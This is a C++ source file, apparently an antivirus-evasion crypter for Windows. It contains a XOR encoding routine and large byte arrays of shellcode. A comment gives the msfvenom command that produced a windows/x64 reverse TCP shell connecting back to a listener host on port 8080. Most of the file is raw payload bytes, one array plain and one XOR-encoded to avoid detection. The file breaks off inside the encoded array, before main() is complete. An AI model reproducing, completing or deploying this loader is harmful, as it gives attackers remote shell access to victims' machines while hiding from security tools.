//#include "<stdafx.h>"
#include "Windows.h"
#include "stdio.h"


unsigned char* do_thing(unsigned char buffer_src[], unsigned char pass[]) {
	int buf_len = strlen((const char*)buffer_src);
	int key_len = strlen((const char*)pass);
	unsigned char* final = new unsigned char[buf_len + 1];


	unsigned char key_char;
	for (int i = 0; i < buf_len; i++) {
		key_char = pass[i % key_len];

		// null removing because i'm lazy and using chars
		if (key_char == buffer_src[i]) {
			final[i] = key_char;
		}
		else {
			unsigned char temp = (unsigned char)(buffer_src[i] ^ key_char);
			if (temp) {
				final[i] = temp;
			}
			else {//is null
				final[i] = key_char;
			}
		}
	}
	return final;
}


int main()
{
	//msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.34  LPORT=8080 -f c 
	// TODO try assigning var below as char * encrypted = 
	unsigned char old_but_stable[] =
		"\xba\xbb\xa9\x1c\x45\x95\x37\x59\xa1\xd0\xf0\xd6\x96\x29\xd7\x2\x5d\x23\x70\x62\x32\x74\xf3\xab\x83\xc2\x2f\xef\x6a\xcd\xcd\xc\xa2\xbb\xfc\xd3\xda\xe8\xe4\x63\xde\x16\xcb\x59\xd2\x6e\x82\xd1\x92\x91\xe5\xd4\xa4\x69\x4d\x17\x6e\x5f\xfa\x4a\x17\x42\x1e\x5e\xcb\xf1\x23\x89\xd7\xb0\xe9\x23\xba\x56\x25\xba\xa\xa1\x8a\xf8\xdb\xea\x85\xa5\x28\x9\xe2\x18\xe5\x7c\x43\x1e\xad\x3d\x93\xd\xe1\x92\x33\xcc\x4d\x4a\xae\xc\x3b\x95\xbc\xf9\x83\xee\x46\x91\x9a\x31\x17\xa0\x2c\xd4\xde\xad\xf8\x8c\x1\x47\x8d\x7b\xee\xa2\x9e\xb9\x99\x64\x3\x97\x3a\xbb\x4f\xab\x32\x6e\xd4\xc4\x21\x8c\xd3\x96\x19\x8b\x7f\xed\xe3\x1c\xe6\x2b\x62\xa3\xd0\x37\x27\xf1\xbc\xb2\x45\x1f\x83\x60\xfd\x58\x2e\x28\x51\x52\x86\xda\xab\x5e\xc7\x54\x33\xc4\x46\xd9\xbb\x3a\xcf\xba\xe\xb9\x30\x9\x63\xbb\xef\xe7\x58\x47\x28\x4c\xf9\x7b\x48\xfc\x8d\xcb\xac\x77\x92\xe6\xca\xd\xf6\x28\x20\x98\x29\xc1\xea\xb2\xde\x83\xe0\x27\xa9\xfe\x23\x9a\x3a\x7\xba\x36\xd8\x2d\xb4\xe\xe3\xec\x20\x8b\xf5\xc8\x68\xf9\x59\x75\x87\x26\x8e\x2a\x40\x8b\x15\xcb\x69\x53\x36\x86\x1c\x6b\xa3\xf\x88\x52\x43\x5e\xe9\xc2\x34\xa7\x3a\x2d\xc4\x1d\x5b\x43\x47\xc9\xf4\x10\xdb\x31\x2c\xb8\x5b\xaf\xf\xbb\xc7\x7f\xe3\xba\xca\xa3\xf4\xc4\xae\xf4\xe7\x17\x28\x7f\x61\x86\x54\x61\x22\xd3\xff\xb1\xa6\x16\xdc\x2a\x52\x56\x1d\xad\x5b\xba\x78\xbc\x84\x15\xad\x1\x1e\x6e\x8\x37\x2e\xe0\xa2\x97\xbe\x44\xec\x52\x33\x87\x4f\x65\x93\x52\x9f\x6d\x19\x55\x37\xdc\x8e\x88\x51\x33\xe6\x4\xa6\xce\x55\x8d\xb\xd4\xe7\x26\x49\x2c\x19\x1d\x9d\x86\x5e\x74\xd6\xa8\xe0\xf3\x61\x2e\x25\x7b\xb1\xb6\x4f\x99\xac\xbc\x81\xda\x3d\x70\x5c\x32\x62\x9f\x72\xb3\xea\xd5\x53\x25\x31\x7c\xa6\x48\xfc\x8f\x39\x90\xd3\xaf\xa0\xdf\x2f\xb\x11\x73\xe0\x6b\x96\xaf\xc5\xfa\xaf\x82\xd\x23\x1e\x9\x27\xd6\x74\x81\xb5\xf7\xe1\xfa\x42\x25\x66\x53\x11\x40\xb2\x8a\xbe\x8c\xe\x1\xc4\xcb\xb8\x44\x44\x28\xce\xc9\x8f\xac\xcd\x84\x86\x7a\x35\x52\x33\xa4\x7\xdc\x60\xf8\x5d\xf3\xfe\xab\x9a\x2a\x29\x62\x35\x35\xdb\x4d\xd5\x63\xd9\xb0\x8\x2\x11\xfe\xae\xb4\x88\x71\x9e\xa9\xf3\xc3\x57\x4\xcc\x49\xb6\x73\xdd\xa8\xb6\xbe\xa9\xd2\x4f\x8b\x94\xb8\x62\x32\xe2\xaa\x18\x5c\x3\x6d\xe5\xa9\x5b\xc\xe5\x68\xc0\x4\x84\x48\xcd\x58\x9c\x12\xa5\x8d\x24\x5f\x99\x93\x24\x2f\xda\x37\x8d\xe2\x76\x78\x86\xa\xc4\xa4\xcd\x55\xac\xbb\xbb\x3b\x87\x45\x63\xa2\x40\xc6\x2\x3b\xdb\x3e\xd0\xb9\x19\x49\xab\xd3\xda\xf8\xa7\x33\xab\xb8\x95\xe1\x72\x7c\x45\xbe\x2e\x10\x7e\x4e\xe4\xcf\x22\x27\x3\x52\x43\x9d\xaa\xbf\x2e\xcd\x65\xa3\x72";
	unsigned char encrypted[] =
		"\x9d\xd7\x65\x56\xc5\x5b\x87\x7c\x36\x37\x50\x72\xdd\x69\xa2\xe4\xac\x5\x9f\xa2\x89\x83\x8f\x97\x9e\x5b\x78\xf4\x3e\x40\x67\xcf\xa2\xa9\x8d\x6a\x4f\x58\x49\xd\x50\x5f\x45\x61\xa7\x82\xf3\x8e\x4a\xf7\xd0\x1f\x2a\x57\x41\x70\x94\xef\xb7\xd0\x61\xc1\x4f\x48\x76\x56\x77\x89\x9f\xeb\xda\x4f\xd4\xe4\xbc\x21\x64\x64\x7e\xde\x8d\xf0\x1e\xe4\x31\x45\x86\xb6\x5c\xcd\xf3\x7a\xe9\x5c\x5f\xe\x11\xcc\xcb\xd6\x40\x28\x64\x90\xe4\xad\x8\xb8\x1\x35\xd4\x74\xbe\xb4\xe0\x8\xde\x14\xb7\xd9\x77\x80\x5b\xe2\x9b\x15\xd\xac\x36\x9d\xdd\x42\x73\xec\xea\x1e\x8b\x7c\xa9\x28\x2a\xf8\x6d\xe6\x4e\x7d\x1\xaf\xfb\xc5\x94\x41\x70\x44\xa1\x5\xb8\xc4\x70\xde\xd9\x50\x29\xb5\x7d\xa5\xc0\x63\xa9\x2d\x98\xf\xd5\xbc\x50\xdd\x65\x2c\x6a\xbf\x8c\x88\x37\x44\x33\xd\xf5\x18\x5e\x95\x8c\xdc\xea\x14\x57\xc2\x12\x74\x1b\x70\x42\xe0\x39\xd\xe6\x75\xf6\xcd\x3\xfd\xbb\xb3\xbf\x4c\x4d\x73\xc0\xdc\xf\x3\x71\x58\xcc\xd2\x95\xdd\xe0\xac\x30\x25\xee\x7b\x4d\xa4\x1a\x58\x8d\x24\xd8\xb9\x24\xb0\xfc\x16\x4b\x5\xb2\x3f\xe6\x8d\x22\xe5\x2\x1c\xd1\xb0\xba\x8c\xe3\x71\xda\xe8\xf8\xa\x7e\x6d\x42\x90\xab\xf5\xe2\xe9\xd7\x74\xb3\x19\x68\xd4\x45\x79\x89\x40\x12\x84\x2d\xd5\xdc\x3\x59\x5d\xe6\x2f\xe5\xac\xb2\xf3\x15\x3c\x17\x85\xbc\xb8\x6c\x57\xe3\x3d\xbf\x2b\xe\x85\x46\xf9\xba\x4\x19\x85\xc2\x84\x73\x56\x72\x10\xc9\x6d\x96\x65\x48\x7e\x33\xed\xf2\x90\x4f\x7c\x89\x50\xf0\xec\x4d\x62\x21\x48\x2\x33\x45\xcd\x2e\x89\xe0\x55\xe7\xa3\x1c\xd4\xbb\x7e\xbd\x34\x4b\x63\xd4\xa0\x17\x98\x78\x35\xd7\xe7\x95\xbd\xee\x3\xd2\xc\xa1\xdf\x6a\x9c\x2c\x90\x8b\x18\xc3\xaf\x2f\x9d\xef\x66\x5b\xe5\xa5\xc\xe7\x64\x7b\xc8\x17\xe4\x4\xca\xbe\x70\xcd\x71\xdd\xc5\xe6\x18\x8\x4d\xa3\xcc\xb4\xdc\x75\xc6\xc4\x4c\x35\x76\x6c\xa8\xd5\x7\x90\x2d\x8a\xcf\x3d\xb5\x57\x9c\x49\x34\x66\xa1\xf1\x94\x3b\x79\x23\x6c\xd4\x5\x47\x95\xdb\xcd\xe2\x1d\x6e\xe6\x1e\x6c\x38\xa4\xbe\xfc\xf9\x70\xd6\x78\x9a\x38\x7a\xfd\x2\xd3\x97\x45\x3b\x9f\xd3\xc4\xfd\xf0\x6b\x44\x81\xc\x85\xd0\x50\xde\x29\x25\x1b\x82\x44\xad\x2e\xf4\xe0\x3c\xe5\xd\x19\xac\xbe\xdd\xb8\x8\x53\xec\xdc\x8d\x17\xb7\x9\x15\x79\x7b\xb6\x94\xe4\x5\xc6\xf4\x18\xdc\x6f\x60\x3f\x91\x93\xf5\xa5\xef\x3e\x7d\x14\x35\x4b\xcc\x2c\xc9\xf3\x5c\xfe\xc9\x22\xd8\xa5\x70\x41\x5d\x4e\x29\xec\xa5\x7\xcd\x18\x24\xd6\x81\xa0\xa4\xbb\x55\xd0\x30\x58\x35\x74\x85\xf\xdc\x91\xd\x86\x9b\x2d\x9c\xb2\x5e\x6e\xc\x47\x10\x87\x68\x5c\x29\x2b\xed\xbf\xb2\x46\x75\x41\x58\xe3\xf4\x4a\x66\x1b\x54\xa7\x3f\xba\xc0\x4f\xad\xde\x55\x18\x44\x74\xdd\x25\x6b\xb0\x2c\xa7\x37\xc8\xbc\x53\xc0\x69\x38\x29\x89\x8d\xbd\xfa\x44\x39\x5\xde\x6b\x45\x84\x6a\x6a\xf5\x4\x2c\x99\x1c\x90\xe0\xf5\x40\xe5\x86\x25\xee\x6d\x5a\xc2\x1a\xfc\x6e\x9a\xa2\x6c\x2b\x5b\xd2\xc8\xb7\x65\x76\x4d\x53\x2b\x93\xd5\x3a\xf7\x2f\x54\xf0\x82\x6f\xb4\x85\x46\x81\x20\x46\x42\x25\xb5\x1e\xea\x40\x3d\x28\x82\xfc\x8c\xf8\x56\x1d\x1c\xba\x17\xb4\x98\x6\x21\xd8\x1d\x2d\xef\x75\x65\xf8\x82\xb1\xe4\xb8\x13\xca\x64\x42\x71\x6b\xf0\xe\x86\x8f\x45\x27\x4a\x3b\xcd\xea\x4c\x47\x5c\xb9\xf5\xf7\xcc\x79\xd7\x1e\x28\x16\x69\xbd\xad\xda\x30\xe8\x35\xb2\xfe\x14\xb4\x4e\x83\xa4\x14\x68\x7\xcc\x80\xc8\x3a\x70\x15\xed\xd2\x9d\x9d\xa4\x86\x29\xec\x74\x5b\x52\x7c\x5a\x6d\x83\xf8\xfe\x35\x27\x7d\xb6\xd5\x42\xc5\x71\x8b\xfe\x44\xd\x5e\x1f\xc4\xd3\x3b\xb6\x50\x81\xf5\xda\xa5\xa0\xcc\x77\x2d\x7a\x62\x8c\xbc\x37\x29\xcc\x2c\xc5\xf8\x65\x88\x88\x88\x89\xd\x5b\x52\x25\x95\x63\x49\x41\x14\x38\xfc\xf9\x74\xf1\x8f\x18\xe0\xcc\x1b\xbf\x75\x61\x34\xea\xfd\x24\xf9\x16\x4c\xf2\x86\xa6\xdc\xd5\x61\xce\x58\x57\x36\x72\xdd\xfe\xd6\x9f\x25\x88\x8b\x2b\xa4\x45\x50\x54\x24\x1a\x41\xfd\xb0\x38\xf2\x21\x5\xe5\xc8\x4c\x8d\xb9\x62\xf9\x1c\x1f\x37\x1\x8c\xdc\xaf\xb0\xe8\xa2\x68\xd7\x6d\x11\x63\x72\xf5\x86\xd1\x8e\x74\xbc\x44\xcf\xd4\x43\xa6\x66\x40\x14\x5f\x85\xd5\xdc\x7e\x20\x5d\xba\x79\x5c\xac\x4d\x80\xfc\x3c\xd\x55\x14\xb8\xcf\x4b\xb8\x3d\x9a\xe2\xd5\x85\xa1\xed\x11\x4\x7a\x1e\xaa\x84\x3c\x2a\xcb\x10\xdb\xeb\x6f\x65\x93\xa2\x9a\xed\xab\x4e\x27\x7c\x60\x13\x57\xec\x39\xdc\xfe\x48\xb7\xe3\x22\xcd\x5f\xe7\x4f\x55\x65\x2\xf4\xd4\x73\xc0\x4\x34\x87\x91\xad\xa0\x1d\xfa\xd1\x35\x2a\x47\x7d\xbd\xf0\xec\x89\xc\x8d\xb9\x31\x9c\x48\x73\x63\x18\x57\x52\x87\x9d\xaf\x87\x22\xe5\x5e\xac\x5e\x64\x12\x60\xff\xe4\x78\x39\x16\x70\x93\xca\xba\xc5\x54\x92\xd7\x4d\x3a\x5a\x6c\xdc\xf6\x33\xac\x4c\x83\xca\xc5\xa8\x18\x94\x69\x2d\x37\xe8\x84\xb5\xf1\x3d\x21\x34\xd5\xc9\x59\x94\x66\x9b\xf8\x6c\x2a\xa4\x1c\x95\xfc\x6d\x4a\x1d\x8d\x1\xf6\x6c\x5b\xde\x6\xfc\x48\xbf\xaf\x78\xe6\x29\xd2\xfd\x81\xc7\x7f\x45\x58\xed\x8b\xc4\x45\xa7\x33\x44\xa9\x2f\x5d\xd0\x19\xd2\x81\x25\x7b\xd6\x2c\xad\x81\x79\x59\x3c\x5b\x5a\xe1\xac\x18\xe2\x10\x8\x31\xa2\xb4\x8d\xbe\x6d\xd2\x15\x40\x3\x6e\x94\x4a\xd6\xae\xf4\xf6\x96\xc7\x60\xa1\xaf\x6b\xf5\x4d\x68\x87\x7d\x13\x4\x23\xcc\x27\x8d\x5b\x5c\xfc\xbc\xfa\xd8\xc9\x4c\x19\x5d\x66\x16\xb4\xa5\x26\xd5\xf0\x24\xfd\xe9\x8\xa4\x81\xba\xa9\x30\x54\x15\xcc\x85\x14\x3e\x79\xd\x2c\xed\x85\x9c\xf9\xb1\x35\xc\xbf\x42\x5f\x68\x5\x4d\x83\xed\x20\xe2\x2e\x75\xf6\x89\x5a\xf4\xbf\x12\xe3\x54\x2a\x2b\x12\xc0\x92\xbc\xb6\x55\xe3\x5d\xdc\xdd\x4b\x40\x68\x2c\xe1\xe8\x90\xbc\xb7\xea\xc1\x38\x64\x1c\x64\xbd\x6c\xcd\x81\x5\x8f\xe0\x3d\x84\xa5\xb7\x5d\x4\x7e\x77\xf7\x90\x4c\x2\x1b\xe5\xe4\xc3\xb6\x6d\xa8\x96\xf2\xfc\x2c\xa4\xa\x6c\xd2\x30\xaa\xc8\x81\xc0\xce\x4d\xf9\x83\x7b\xd5\xd\x5a\x80\x54\xd8\x6f\x38\xb4\x9d\x3f\x59\x20\xb6\xc4\xfd\xb5\x7e\x91\x28\x3d\x2\x59\x55\x8c\xc7\x66\xe5\x1c\x94\x34\xc\x98\xba\xc0\xb0\x1d\x3d\xda\xdd\x65\x91\x22\x6a\xe4\xae\xda\x92\x64\x6a\xc0\xc3\xf0\x21\x23\x66\x45\x9c\x9d\x83\xcd\xf9\xa8\x3f\x5c\x34\x7e\x40\xcc\xc5\x7\xf1\x28\xdd\xc6\x15\xad\x69\x87\xb0\x35\x3f\x58\xcd\xb4\x9c\x68\xd\x14\x5f\x3f\xa4\x80\x71\x97\xc8\x15\x32\xee\x65\x9d\xca\x6a\x82\xec\x86\x9f\x3a\x7c\x58\xa7\x5b\xf8\x56\x61\xfe\x7d\xff\x21\x2b\xc5\x82\xf4\x57\x44\x11\xdb\xe7\xc4\x24\x64\x9\x50\xbe\x2a\xad\xa5\x1f\xed\xd8\x2d\x73\xd7\x64\xbc\xdd\x44\x95\x2c\x4f\xad\x3c\x88\xb1\x1e\x63\xd\x56\x63\x8e\x95\x10\x86\x3a\x14\x74\x54\x43\x74\x84\x16\xf2\xe0\x4b\x22\x16\x75\x1c\xeb\xb3\xfd\x7b\xd6\xcf\x4c\x88\x39\x70\xdc\x55\xf6\xa1\x58\x7f\x87\xc5\xdd\x34\x1d\x61\x25\xa0\x7b\x9d\xa4\x8\x8c\x3d\x24\x22\x59\x57\xb0\xb9\x1a\xfb\x5\x52\x65\x16\x8d\x67\x80\x52\x1c\x2f\xb\xeb\x8c\xe8\x22\xa\xe8\xa0\xfb\xae\x6d\x4d\x94\xdb\xf5\x14\x50\x60\x74\x71\x3b\x98\xd4\xd7\xa5\x39\x40\x70\x7\x5c\xd5\x24\x2b\x89\x5d\xf0\xac\x35\xac\xb0\x56\x46\x3c\x4a\x69\xef\xb8\x2\x30\x13\x3d\x7a\x8a\xbe\x85\xdd\xa5\xca\x4\x39\x76\x73\x84\xaf\x32\xa2\x10\x48\xc5\xc6\x65\x64\x8d\x63\xed\x39\xa1\x9f\x7c\x9d\x74\x20\xec\xf7\x36\x51\x48\x76\x96\xf5\xcd\xcc\xe8\x10\x55\x2a\x6f\xad\xd4\xc0\xcc\xed\x34\x98\x63\x7\xa0\xb9\x3f\xab\x35\x68\xdb\xc6\xbd\x3d\x93\x62\xc\xcc\xae\x9a\x9c\xc4\x76\x3a\x18\x3e\x65\x5e\x9d\x99\xd8\x8b\xe5\xa4\x69\x30\x64\x26\x6e\x48\xe4\xd8\x9a\xe9\x70\xfd\x5d\xc\xc5\xa9\x7b\xb9\x4d\x7e\x30\xc5\xdc\xa\x9c\x75\x4c\xcf\xad\x9c\xa8\x81\x72\xc3\x2d\xf1\x23\x6e\xb5\x66\x9d\x9a\x34\xcb\xae\x22\x94\x71\x32\x52\x6c\x1d\xce\xf6\x95\xca\x8e\x13\x1d\x9f\xa6\xaf\x6c\x57\x65\xd0\xfc\x69\x39\x1\x78\x29\x90\xa5\xfd\xf0\x15\xc1\x45\xdb\x39\x7d\xc4\x47\xc4\x9d\x44\xff\x9b\x34\xd0\x96\xa0\x58\x25\x5c\x25\xf6\xad\x40\x9a\x32\x3c\xa1\xfb\x4a\xac\x1\xe\xea\x8\x30\xd4\xe\x8d\xfc\x8a\xbb\x15\x8f\xf3\xc7\x94\x48\x60\x78\xf4\x19\x95\x99\x60\xcb\xfd\x3d\xf5\xef\x11\x69\x7d\xa7\x9b\x95\xcc\x73\xa1\x25\x5c\x68\x68\x4f\xd8\x9c\x65\xf3\x5d\xa5\x85\x1e\xa5\x79\x53\xab\x24\xa\x3c\xd3\xa4\x87\xf5\x2\x30\xb3\xdb\xa6\x85\x2d\x78\xcc\xd\x82\x78\x78\x9c\xe9\x87\x80\xc\x42\x53\x30\x68\xf0\x32\x54\xed\xb1\xe0\xf1\x75\x48\x89\xd\xf4\xc\x57\x4e\x54\x82\x60\xe7\xc0\xe4\x28\xb\x55\x57\xe5\xa6\xdd\xe9\x81\xc2\x2c\xb6\x59\x7b\xbc\x76\x12\x9a\x38\x77\x7f\x3e\xbd\xce\x92\x6b\x5\x7b\x52\x90\x84\x34\x44\x28\x4\x9d\xf4\x49\x90\xbb\x8f\xed\xe5\x71\x41\x19\x6d\x34\x49\xa5\xfc\xcd\xa7\xd5\x6c\xc5\x51\x7f\xc8\x77\x1d\xa3\x4d\x37\x35\xce\xd5\xca\xf9\x7a\x54\x98\x81\x82\xb4\x5e\x59\x32\x20\x7f\x63\x56\xb5\x34\x31\xf3\x3d\xf4\xad\xf\x8c\x8c\x59\xb0\x1c\x50\x6d\xe1\x98\x2\x2f\x5\x1d\x21\xb2\xa0\x65\xe7\x54\xdd\xe4\xba\x40\x7d\x64\x46\xf3\x94\xf0\xa\xde\x38\x45\xd9\x20\x56\xcd\xef\x91\x92\x5c\xa6\xa5\x2a\xcc\x79\x35\x4a\x28\x18\x91\xee\xad\xce\xbc\x1b\x35\x98\x24\xa0\xb4\xaf\xc0\xd8\x14\x6b\xce\x79\x80\x20\x77\x9c\x15\xc9\x1f\xc9\x9d\x9a\xdb\x75\xec\xac\x95\x85\x7c\x6c\xfc\x2c\xf8\x2e\x6d\x53\x7d\xc4\x85\xfe\xc5\x81\xa8\xa\x44\x5b\x72\xb3\xc4\x1a\x3\xe2\x50\x3d\xce\x6\xa5\xeb\xd5\xa3\x2d\xbf\x70\xd8\xbc\x4c\x5c\x60\x2c\x8\x90\x91\x88\xc0\xfd\x35\xd\xe0\x16\x51\x95\xbb\xdd\xed\x14\x76\x96\x2d\x74\xd\xa6\x44\xe0\xca\x7e\xeb\x75\xe2\x18\x6\xfd\xa3\x81\xa2\x4c\x71\xbf\xda\xdc\xd\x1d\x7a\x58\xc8\xd8\x9e\xdd\xe5\xf7\xcb\x25\xa5\xb2\x77\xa4\x7f\x25\x88\x24\x1\xd3\x29\xb0\xd3\xb4\x4d\x5\x97\x67\xf9\x8d\x55\x7\x5\x1c\x68\xda\xb5\x8c\x31\xbf\xdc\xe8\xe4\x7c\x3\x6d\x89\x14\xae\xf5\x5b\xdf\xda\x74\x6e\xbf\x62\xd4\x34\x70\x92\x40\xe0\x5b\x36\xd5\x88\xf3\x53\x5d\x5d\xbf\xef\xac\x6b\x1c\x10\x3c\x2e\xd7\x41\xb8\xeb\xe6\xe5\x3d\x83\xaa\x68\x85\x5d\x2d\xbd\x4\x10\xd4\xdd\x84\x28\xe0\x74\x10\xec\xb3\x98\x65\xb8\x52\x36\xed\x4f\xd\x72\x7c\x18\xdd\x8a\xec\xdb\xba\x2b\x48\xfb\x7f\x4e\xcd\xad\x41\xfb\x55\x74\xe4\x7\xd4\xa\xf0\xb7\x34\xd7\x8\xd9\xa0\xfc\x83\x7d\x35\xad\xab\xa8\xbd\x70\x14\xd5\xc\xf\xd0\x65\x9c\xd3\xe3\x8c\x18\x81\xbc\x30\x9d\xa7\x5d\x5e\xe5\x7a\x46\xea\x64\xd\xb2\x12\xe4\xd4\x42\x42\x70\xfe\x4a\xe6\xc5\xff\xb5\x3\x4d\x51\xc\xb8\xdc\xe9\x3c\xc0\x4c\xe7\xca\x71\xa8\xd\xd8\x95\x2d\xde\x7c\x31\xb5\xb7\x30\x4d\x34\x46\xcf\x8d\x94\x1e\xd2\x24\x6c\x6b\x69\x4b\x95\x80\x27\xe6\x1d\x45\x91\x2\x6c\x1b\xa5\xba\xfc\x77\x6f\xda\x78\xa6\x37\x7e\xfd\x1b\xe9\xab\x45\x2f\x8d\xd7\xc4\xfe\x11\x68\x44\xeb\x2b\x89\xd0\x3\xf7\x2d\x25\x7a\x9e\x58\xad\x81\x4c\xe5\x3c\x5f\x45\x15\xac\x1c\xf7\xbc\x8\x32\xdc\xe0\x8d\xf1\x7a\xe\x15\xdc\x31\xba\x94\x15\xf7\xc2\xf4\x26\xd1\x73\x60\xeb\x61\x96\xf5\xbc\x36\x33\x7d\x44\xf4\x4f\xcc\x19\x82\x8f\x5c\x77\x45\x21\xd8\x9e\x44\x45\x5d\x19\xf6\xe0\xa5\x26\xe6\x1c\x24\xf9\x1c\xbd\xa4\x82\x82\xd4\x30\x1d\xba\x78\x85\x2d\x8\x96\xd\xa5\x27\xd2\x9c\x5f\xe3\x6a\xc\x67\xb2\x8b\x68\x2b\x7e\x2e\xed\xab\x49\x5b\x75\xa\xb0\xe7\xf4\x3d\x27\x18\x54\xf3\x84\xb9\xc0\x9c\xb0\xdd\x55\x49\x9\x9\xdd\x4e\x72\xb5\x2c\xe2\xb4\xc5\xbc\xea\x10\x6f\x38\x56\x2a\x93\xbd\xf3\xa4\x3e\x5\xb4\x10\x4b\x84\x45\x2f\xf3\x4\x49\xb0\x22\x90\xed\x1c\x41\xe5\x80\x37\xec\x6d\xf\xa1\x18\xfc\x21\xa\xa1\x6c\xf0\x2b\xd0\xc8\xcf\xfc\x74\x4d\x14\xac\x91\xd5\x2c\x4b\x2e\x54\xf6\x7\x6e\xb4\xea\xd9\x87\x20\x5e\xb4\x2b\xb5\xef\x5d\x47\x3d\xbd\x5\xe3\x8c\x4f\xdb\x1b\x1c\x44\xb9\xba\x98\xf5\x42\xd9\x1d\xe2\x11\x74\x65\x4b\xd8\xb0\xe4\xb7\xe9\xc8\x64\x4f\xec\x69\xf0\x4\x47\x8c\x45\x74\xeb\x39\xcd\x86\xea\x45\x5c\x40\x1a\xf6\xcc\xb\x7e\x1f\x28\xc3\x80\x43\xad\xb3\x56\xef\x35\x79\x1e\x1b\xb4\x8\x25\xa3\x14\x83\xb4\xd2\x80\xa8\x18\x71\x15\x17\x3a\x9c\x9d\x83\xa4\x28\xec\xb3\x17\x51\x7c\x45\x27\x80\xf8\x18\xf3\x24\x7d\x86\x9e\x41\xc5\xbb\x1a\xfe\x44\x24\x72\x1e\xc4\x85\xd8\xb7\x50\xa7\x6c\xda\xa5\x2f\x34\x77\x2d\xda\xf2\xb3\xbc\x91\xde\xcb\x2c\xfb\x66\x65\x88\x4f\x22\x89\xd\x9e\xe2\x24\x95\xf2\xb7\x40\x14\x56\x4d\xf9\x74\xba\x1d\x18\xe0\x5d\x71\xbc\x75\x46\xf2\xe9\xfd\xe6\x1e\x16\x4c\xbf\x7a\xa6\xdc\x14\x84\xcf\x58\xc3\x4e\x72\xdd\xe7\xe\x9f\x25\xbd\x22\x2b\xa4\x4b\xf8\x53\x24\x5f\xb3\x82\xb0\xf3\x12\x21\x5\xb7\x91\x4c\x8d\x26\xee\xf8\x1c\x8b\x19\x1\x8c\xbb\x24\xb0\xe8\x37\xbf\xd4\x6d\xd5\x51\x72\xf5\xbe\x18\x8e\x74\x27\x85\xce\xd4\x8f\xef\x67\x40\xaf\x14\x8a\xd5\x12\x90\x27\x5d\xd9\xed\x43\xac\xed\x42\xfc\x3c\xaf\xaf\x15\xb8\x6f\x1b\xb8\x3d\x6e\x3b\xd5\x85\x94\xf5\x11\x4\xf8\x85\xa9\x84\x57\x4f\xcb\x10\x87\x1\x6f\x65\xaa\xca\x9a\xed\x2d\xb2\x26\x7c\xdf\x22\x57\xec\xca\xd5\xfe\x48\x37\xe5\x22\xcd\xdd\xe7\x4f\x55\xb9\x3\xf4\xd4\x70\x95\x4\x34\x6\xac\xad\xa0\xcb\x71\xd0\x35\x91\x21\x7d\xbd\xfa\xce\x89\xc\x60\x95\x31\x9c\xc5\xf5\x60\x18\x66\x6\x87\x9d\x6b\x83\x22\xe5\x9f\xa6\x5e\x64\x59\x79\xff\xe4\x37\x62\x16\x70\xe4\x98\xba\xc5\x89\xbf\xd7\x4d\x5e\x68\x6c\xdc\x6e\x36\xac\x4c\x7d\x94\xc5\xa8\x90\xf0\x69\x2d\x5\x49\x85\xb5\x6e\xe7\x21\x34\x87\xa4\x59\x94\xc\x72\xfb\x6c\x7b\x38\x1f\x95\x97\x85\x4a\x1d\xf9\xa1\xf6\x6c\x37\x77\x7\xfc\x9b\x64\xae\x78\xee\xc5\xd2\xfd\x4\x6b\x78\x45\xc0\x6b\x84\xc4\xcd\x97\x34\x44\x77\xab\x5d\xd0\x19\x22\x80\x25\x9e\x83\x2d\xad\xaf\xfb\x59\x3c\x77\x1\xe2\xac\x38\x94\x13\x8\xb7\xab\xb7\x8d\x5b\x38\xd3\x15\x6e\xcd\x6f\x94\x3f\xc1\xaf\xf4\xae\x21\xc1\x60\x16\x88\x65\xf5\x66\xfe\x80\x7d\x92\x44\x3d\xcc\x1\xec\x5d\x5c\x6b\xed\xf4\xd8\xda\x40\x1b\x5d\x77\xa0\xb6\xa5\x67\x45\xf3\x24\x9a\x1d\xb\xa4\xf2\x7b\xaa\x30\x1b\xed\xce\x85\xc8\x5a\x64\xd\x9b\xa6\x80\x9c\xff\x47\x39\xc\x7\x1f\x58\x68\xcb\xdc\xfc\xed\xcd\xf1\x29\x75\x74\xe7\x55\xf4\xb\x1e\xe6\x54\xdd\x2c\xf\xc0\xd6\xe9\xb3\x55\x75\xa2\xde\xdd\xc\x4f\x6b\x2c\x8d\x47\x93\xbc\xfe\xf9\xc2\x38\x45\x84\x66\xbd\xb4\x4c\x8c\x5\x4f\x1b\x38\x84\x57\x70\x40\x4\xbb\x89\xf1\x90\x5f\x43\x14\xe5\x10\xa\xb1\x6d\x81\x29\xcd\xfc\xe5\xb5\xd\x6c\x11\x46\xa7\xc8\x39\x1f\xcb\x4d\xf2\x37\x66\xd5\x8f\xfb\x82\x54\x5a\x88\x3a\xb4\x49\x50\x5a\x20\xe6\x19\xfe\xb5\x8b\x31\x2b\x3d\x59\xfe\x57\x8c\x69\x83\xe7\x1c\x35\x52\x9\x98\x8f\x62\xad\x1d\x58\x2d\xd8\x65\x65\xc1\x64\xe4\x35\x9c\x94\x64\xcd\xac\x3d\xf0\x81\x74\x60\x45\xf4\x4f\x8d\xcd\x8\x94\x39\x5c\x92\xad\x41\xcc\xae\x7e\xf3\x28\x3c\x3d\x17\xad\x84\x83\xb2\x35\xf0\xa2\xce\xb4\xc\x68\xf\x14\xdf\x3b\xa6\x80\x82\xc7\xca\x15\xa4\x8c\x67\x9d\x67\x57\x9c\xec\x3f\x63\x3c\x7c\x92\x22\x55\xf8\x40\xfc\xf9\x7d\x6d\xad\x14\xc5\x76\x40\x51\x44\x8d\x17\xe9\xc4\x5c\xdf\x8\x50\x51\xc9\xac\xa5\xf1\x60\xda\x2d\xdd\x6\x66\xbc\x11\xda\x96\x2c\x2b\xea\x3f\x88\xe3\xb3\x63\xd\x88\x5b\x8f\x95\x51\x19\x3b\x14\x60\xdd\x43\x74\x7f\xe6\xf2\xe0\x93\xae\x16\x75\x2\x38\xbc\xfd\x3e\xd4\xc8\x4c\xf8\xeb\x70\xdc\x89\xaa\xa1\x58\x7\x76\xc4\xdd\x7d\x48\x61\x25\xdb\x9d\x9d\xa4\x17\xa3\x3d\x24\x27\x60\x57\xb0\xbc\x39\xfb\x5\x4d\xda\x16\x8d\x1c\x93\x52\x1c\x7c\xae\xea\x8c\xbe\x7a\xa\xe8\xa\x3a\xae\x6d\x21\xdc\xdb\xf5\xe8\xde\x67\x74\xbb\x64\x98\xd4\x46\x33\x39\x40\xf\xfb\x5d\xd5\x70\x90\x88\x5d\xba\x5f\x35\xac\x19\x6d\x45\x3c\x20\x38\xec\xb8\xa2\xfe\x10\x3d\x42\x91\xbd\x85\x4\x45\xca\x4\xd2\x10\x72\x84\xe7\xd8\xa3\x10\xb0\xe4\xc7\x65\x7c\xaf\x62\xed\x1\x43\x9f